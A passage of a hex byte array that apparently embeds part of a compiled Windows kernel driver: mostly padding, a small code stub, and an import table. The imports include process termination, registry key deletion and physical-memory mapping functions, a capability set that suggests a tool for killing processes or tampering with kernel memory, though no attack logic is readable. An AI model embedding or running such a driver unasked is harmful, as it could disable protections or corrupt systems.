0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x10, 0x00, 0x00, 0x0B, 0x11, 0x00, 0x00, 0x38, 0x69, 0x00, 0x00, 0xE0, 0x11, 0x00, 0x00,
0x82, 0x12, 0x00, 0x00, 0x4C, 0x69, 0x00, 0x00, 0x90, 0x12, 0x00, 0x00, 0x61, 0x13, 0x00, 0x00,
0x74, 0x69, 0x00, 0x00, 0x70, 0x13, 0x00, 0x00, 0xB8, 0x13, 0x00, 0x00, 0xB0, 0x69, 0x00, 0x00,
0xC0, 0x13, 0x00, 0x00, 0x47, 0x14, 0x00, 0x00, 0xCC, 0x69, 0x00, 0x00, 0x50, 0x14, 0x00, 0x00,
0x4C, 0x26, 0x00, 0x00, 0xF8, 0x69, 0x00, 0x00, 0x50, 0x26, 0x00, 0x00, 0xAD, 0x26, 0x00, 0x00,
0x18, 0x6A, 0x00, 0x00, 0xB0, 0x26, 0x00, 0x00, 0xE9, 0x26, 0x00, 0x00, 0x24, 0x6A, 0x00, 0x00,
0xE9, 0x26, 0x00, 0x00, 0xDA, 0x27, 0x00, 0x00, 0x30, 0x6A, 0x00, 0x00, 0xDA, 0x27, 0x00, 0x00,
0x64, 0x28, 0x00, 0x00, 0x54, 0x6A, 0x00, 0x00, 0x64, 0x28, 0x00, 0x00, 0x6B, 0x28, 0x00, 0x00,
0x68, 0x6A, 0x00, 0x00, 0x6B, 0x28, 0x00, 0x00, 0x75, 0x28, 0x00, 0x00, 0x78, 0x6A, 0x00, 0x00,
0x75, 0x28, 0x00, 0x00, 0x99, 0x28, 0x00, 0x00, 0x8C, 0x6A, 0x00, 0x00, 0x99, 0x28, 0x00, 0x00,
0xDC, 0x2A, 0x00, 0x00, 0xA0, 0x6A, 0x00, 0x00, 0xDC, 0x2A, 0x00, 0x00, 0xE9, 0x2A, 0x00, 0x00,
0xC8, 0x6A, 0x00, 0x00, 0xF0, 0x2A, 0x00, 0x00, 0x56, 0x2B, 0x00, 0x00, 0xDC, 0x6A, 0x00, 0x00,
0x56, 0x2B, 0x00, 0x00, 0x41, 0x2C, 0x00, 0x00, 0xF0, 0x6A, 0x00, 0x00, 0x41, 0x2C, 0x00, 0x00,
0x5E, 0x2C, 0x00, 0x00, 0x08, 0x6B, 0x00, 0x00, 0x60, 0x2C, 0x00, 0x00, 0xC6, 0x2C, 0x00, 0x00,
0xDC, 0x6A, 0x00, 0x00, 0xC6, 0x2C, 0x00, 0x00, 0xB1, 0x2D, 0x00, 0x00, 0x1C, 0x6B, 0x00, 0x00,
0xB1, 0x2D, 0x00, 0x00, 0xCE, 0x2D, 0x00, 0x00, 0x34, 0x6B, 0x00, 0x00, 0xD0, 0x2D, 0x00, 0x00,
0xD9, 0x2F, 0x00, 0x00, 0x48, 0x6B, 0x00, 0x00, 0xE0, 0x2F, 0x00, 0x00, 0x3A, 0x31, 0x00, 0x00,
0x74, 0x6B, 0x00, 0x00, 0x40, 0x31, 0x00, 0x00, 0x9A, 0x32, 0x00, 0x00, 0xA4, 0x6B, 0x00, 0x00,
0xA0, 0x32, 0x00, 0x00, 0x44, 0x34, 0x00, 0x00, 0xD4, 0x6B, 0x00, 0x00, 0x44, 0x34, 0x00, 0x00,
0x99, 0x35, 0x00, 0x00, 0xEC, 0x6B, 0x00, 0x00, 0x99, 0x35, 0x00, 0x00, 0xBC, 0x35, 0x00, 0x00,
0x00, 0x6C, 0x00, 0x00, 0xC0, 0x35, 0x00, 0x00, 0xB8, 0x38, 0x00, 0x00, 0x14, 0x6C, 0x00, 0x00,
0xC0, 0x38, 0x00, 0x00, 0x7C, 0x40, 0x00, 0x00, 0x30, 0x6C, 0x00, 0x00, 0x80, 0x40, 0x00, 0x00,
0x15, 0x43, 0x00, 0x00, 0x48, 0x6C, 0x00, 0x00, 0x20, 0x43, 0x00, 0x00, 0xB9, 0x44, 0x00, 0x00,
0x74, 0x6C, 0x00, 0x00, 0xB9, 0x44, 0x00, 0x00, 0x13, 0x4C, 0x00, 0x00, 0x88, 0x6C, 0x00, 0x00,
0x13, 0x4C, 0x00, 0x00, 0x42, 0x4C, 0x00, 0x00, 0xA0, 0x6C, 0x00, 0x00, 0x42, 0x4C, 0x00, 0x00,
0x4B, 0x4C, 0x00, 0x00, 0xB4, 0x6C, 0x00, 0x00, 0x10, 0x58, 0x00, 0x00, 0x68, 0x58, 0x00, 0x00,
0xCC, 0x6C, 0x00, 0x00, 0x68, 0x58, 0x00, 0x00, 0x98, 0x58, 0x00, 0x00, 0x04, 0x6D, 0x00, 0x00,
0x98, 0x58, 0x00, 0x00, 0xC4, 0x58, 0x00, 0x00, 0xF4, 0x6C, 0x00, 0x00, 0xC4, 0x58, 0x00, 0x00,
0x14, 0x5A, 0x00, 0x00, 0xD8, 0x6C, 0x00, 0x00, 0x14, 0x5A, 0x00, 0x00, 0x23, 0x5A, 0x00, 0x00,
0x04, 0x6D, 0x00, 0x00, 0x24, 0x5A, 0x00, 0x00, 0x50, 0x5A, 0x00, 0x00, 0x04, 0x6D, 0x00, 0x00,
0x50, 0x5A, 0x00, 0x00, 0x11, 0x5B, 0x00, 0x00, 0x10, 0x6D, 0x00, 0x00, 0x14, 0x5B, 0x00, 0x00,
0x8E, 0x5C, 0x00, 0x00, 0x34, 0x6D, 0x00, 0x00, 0xA4, 0x5C, 0x00, 0x00, 0x75, 0x5D, 0x00, 0x00,
0x20, 0x6D, 0x00, 0x00, 0xC0, 0x5D, 0x00, 0x00, 0xC6, 0x5D, 0x00, 0x00, 0x50, 0x6D, 0x00, 0x00,
0xE0, 0x5D, 0x00, 0x00, 0xE5, 0x5D, 0x00, 0x00, 0x50, 0x6D, 0x00, 0x00, 0x00, 0x5E, 0x00, 0x00,
0x06, 0x5E, 0x00, 0x00, 0x50, 0x6D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x48, 0x8B, 0x05, 0x29, 0xE0, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x1B, 0x48, 0xB9, 0x32, 0xA2,
0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00, 0x48, 0x3B, 0xC1, 0x74, 0x0C, 0x48, 0xF7, 0xD0, 0x48, 0x89,
0x05, 0x13, 0xE0, 0xFF, 0xFF, 0xC3, 0xCC, 0xB9, 0x06, 0x00, 0x00, 0x00, 0xCD, 0x29, 0xCC, 0xCC,
0xA0, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9A, 0x93, 0x00, 0x00,
0x30, 0x60, 0x00, 0x00, 0x70, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x3A, 0x94, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xF8, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xCE, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22, 0x94, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x0C, 0x94, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xE0, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x08, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x62, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x8C, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA6, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xB2, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCE, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xDA, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF2, 0x92, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x08, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1E, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x3E, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x70, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x86, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xC0, 0x93, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xB2, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x98, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x80, 0x91, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x51, 0x0C, 0x5F, 0x5F, 0x43, 0x5F, 0x73, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x5F, 0x68,
0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x00, 0x7B, 0x08, 0x52, 0x74, 0x6C, 0x43, 0x6F, 0x6D,
0x70, 0x61, 0x72, 0x65, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E,
0x67, 0x00, 0xC0, 0x04, 0x4B, 0x65, 0x44, 0x65, 0x6C, 0x61, 0x79, 0x45, 0x78, 0x65, 0x63, 0x75,
0x74, 0x69, 0x6F, 0x6E, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x00, 0x0E, 0x06, 0x4D, 0x6D,
0x49, 0x73, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x56, 0x61, 0x6C, 0x69, 0x64, 0x00, 0x00,
0xFB, 0x06, 0x4F, 0x62, 0x66, 0x44, 0x65, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65,
0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x00, 0x16, 0x03, 0x49, 0x6F, 0x41, 0x6C, 0x6C, 0x6F,
0x63, 0x61, 0x74, 0x65, 0x4D, 0x64, 0x6C, 0x00, 0xEE, 0x07, 0x50, 0x73, 0x50, 0x72, 0x6F, 0x63,
0x65, 0x73, 0x73, 0x54, 0x79, 0x70, 0x65, 0x00, 0x76, 0x07, 0x50, 0x73, 0x43, 0x72, 0x65, 0x61,
0x74, 0x65, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x00,
0x3A, 0x09, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65,
0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0xD0, 0x07, 0x50, 0x73, 0x49, 0x6E, 0x69, 0x74,
0x69, 0x61, 0x6C, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,
0x00, 0x00, 0xE0, 0x05, 0x4D, 0x6D, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x61,
0x70, 0x70, 0x69, 0x6E, 0x67, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x8D, 0x0B,
0x5A, 0x77, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x4B, 0x65, 0x79, 0x00, 0x0B, 0x06, 0x4D, 0x6D,
0x47, 0x65, 0x74, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x46, 0x6F, 0x72, 0x50, 0x68, 0x79,
0x73, 0x69, 0x63, 0x61, 0x6C, 0x00, 0x78, 0x03, 0x49, 0x6F, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x64,
0x6C, 0x00, 0x0A, 0x06, 0x4D, 0x6D, 0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x52,
0x6F, 0x75, 0x74, 0x69, 0x6E, 0x65, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x9E, 0x0C,
0x5F, 0x73, 0x74, 0x72, 0x69, 0x63, 0x6D, 0x70, 0x00, 0x00, 0xFC, 0x05, 0x4D, 0x6D, 0x46, 0x72,
0x65, 0x65, 0x4D, 0x61, 0x70, 0x70, 0x69, 0x6E, 0x67, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73,
0x00, 0x00, 0x41, 0x0C, 0x5A, 0x77, 0x54, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74, 0x65, 0x50,
0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0x4E, 0x06, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61,
0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x00, 0x00, 0x20, 0x06,
0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73,
0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x79, 0x43, 0x61, 0x63, 0x68, 0x65, 0x00, 0x00, 0x66, 0x03,
0x49, 0x6F, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x54, 0x79,
0x70, 0x65, 0x00, 0x00, 0x06, 0x06, 0x4D, 0x6D, 0x47, 0x65, 0x74, 0x50, 0x68, 0x79, 0x73, 0x69,
0x63, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x52, 0x61, 0x6E, 0x67, 0x65, 0x73, 0x00,
0x6A, 0x0B, 0x5A, 0x77, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0xBF, 0x0B, 0x5A, 0x77, 0x4F, 0x70,
0x65, 0x6E, 0x4B, 0x65, 0x79, 0x00, 0x78, 0x08, 0x52, 0x74, 0x6C, 0x43, 0x6F, 0x6D, 0x70, 0x61,
0x72, 0x65, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x00, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72,
0x6E, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x91, 0x08, 0x52, 0x74, 0x6C, 0x43, 0x6F, 0x70,
0x79, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00,
0x77, 0x00, 0x44, 0x62, 0x67, 0x50, 0x72, 0x69, 0x6E, 0x74, 0x45, 0x78, 0x00, 0x00, 0x06, 0x00,
0x57, 0x64, 0x66, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x42, 0x69, 0x6E, 0x64, 0x00, 0x00,
0x03, 0x00, 0x57, 0x64, 0x66, 0x4C, 0x64, 0x72, 0x51, 0x75, 0x65, 0x72, 0x79, 0x49, 0x6E, 0x74,
0x65, 0x72, 0x66, 0x61, 0x63, 0x65, 0x00, 0x00, 0x08, 0x00, 0x57, 0x64, 0x66, 0x56, 0x65, 0x72,
0x73, 0x69, 0x6F, 0x6E, 0x55, 0x6E, 0x62, 0x69, 0x6E, 0x64, 0x00, 0x00, 0x07, 0x00, 0x57, 0x64,
0x66, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x42, 0x69, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73,
0x73, 0x00, 0x09, 0x00, 0x57, 0x64, 0x66, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x55, 0x6E,
0x62, 0x69, 0x6E, 0x64, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x00, 0x57, 0x44, 0x46, 0x4C, 0x44, 0x52,
0x2E, 0x53, 0x59, 0x53, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x60, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x10, 0xA1, 0x18, 0xA1, 0x20, 0xA1, 0x28, 0xA1,
0x30, 0xA1, 0xA8, 0xA5, 0xC0, 0xA5, 0xC8, 0xA5, 0x68, 0xA6, 0x70, 0xA6, 0x78, 0xA6, 0x80, 0xA6,
0x90, 0xA6, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x08, 0xA0, 0x20, 0xA0,
0x68, 0xA0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
